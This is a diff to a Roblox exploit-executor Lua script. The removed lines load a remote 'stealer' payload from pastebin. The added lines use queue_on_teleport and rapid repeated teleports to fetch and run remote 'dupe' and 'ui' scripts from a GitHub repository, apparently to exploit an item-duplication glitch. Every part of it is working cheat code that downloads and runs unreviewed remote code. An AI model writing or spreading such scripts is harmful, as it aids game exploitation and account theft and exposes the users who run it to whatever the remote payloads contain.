@@ -1,11 +1,16 @@
-local function stealer()
-    loadstring(game:HttpGet("https://pastebin.com/raw/2MrdkW6b"))() -- replace with actual stealer
+local TeleportService = game:GetService("TeleportService")
+
+TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,v)
+    queue_on_teleport(string.format([[
+        getgenv().JobId = "%s"
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/panumas13119/Dds/refs/heads/main/dupe"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/panumas13119/Dds/refs/heads/main/ui"))()
+    ]], v.ServerInstanceId))
+end)
+
+for _ = 1, 2 do
+    task.spawn(function()
+        TeleportService:TeleportToPlaceInstance(126884695634066, game.JobId)
+    end)
+    task.wait()
 end
-local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/panumas13119/Dds/refs/heads/main/Hee"))()
-
-end
-
-task.spawn(stealer)
-task.spawn(loadui)
-
